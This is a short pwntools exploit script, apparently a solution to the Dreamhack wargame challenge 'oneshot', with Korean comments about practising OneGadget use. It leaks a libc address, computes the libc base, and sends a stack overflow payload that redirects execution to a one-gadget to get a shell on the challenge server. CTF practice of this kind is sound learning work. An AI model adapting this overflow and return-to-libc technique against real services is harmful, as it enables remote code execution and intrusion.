# https://dreamhack.io/wargame/challenges/34/
# dreamhack oneshot
# OneGadget 사용법 연습하기

from pwn import *
def slog(n, m): return success(": ".join([n, hex(m)]))

context.log_level = 'debug'

p = remote("host3.dreamhack.games", 17225)
# p = process("./oneshot")

# libc를 제공해 주었을때 사용
libc = ELF("./libc.so.6") #libc-2.23
# gdb.attach(p)

# [1] Get information about buf
buf2sfp = 16
# buf2ret = buf2cnry+0x8+0x8

# onegadget 주소
# Using 
og = 0x45216

slog("buf2sfp", buf2sfp)
print(libc.symbols["_IO_2_1_stdout_"])

p.recvuntil(b"stdout: ")
tmp=p.recvline() #64bit
print(tmp[:-1])
stdout = int(tmp[:-1], 16)

# [2] Get libc_base
slog("stdout", stdout)

# Get libc_base offset using debugging
libc_base = stdout - 3954208
slog("libc_base", libc_base)

# Use OneGadget in libc
# 당연하게도 libc안에 있는 가젯은 립씨 베이스를 더해줘야
# (중요)메모리에 바이너리와 libc가 매핑된 영역은 다르다!!!
goto_oneshot = libc_base + og
slog("go_oneshot", goto_oneshot)

payload = b"A"*(buf2sfp)+b"\x00"*0x10+b"B"*0x8
payload += p64(goto_oneshot)

p.recvuntil(b"MSG: ")
p.send(payload) #sendline is have \n
p.recvline()

p.interactive()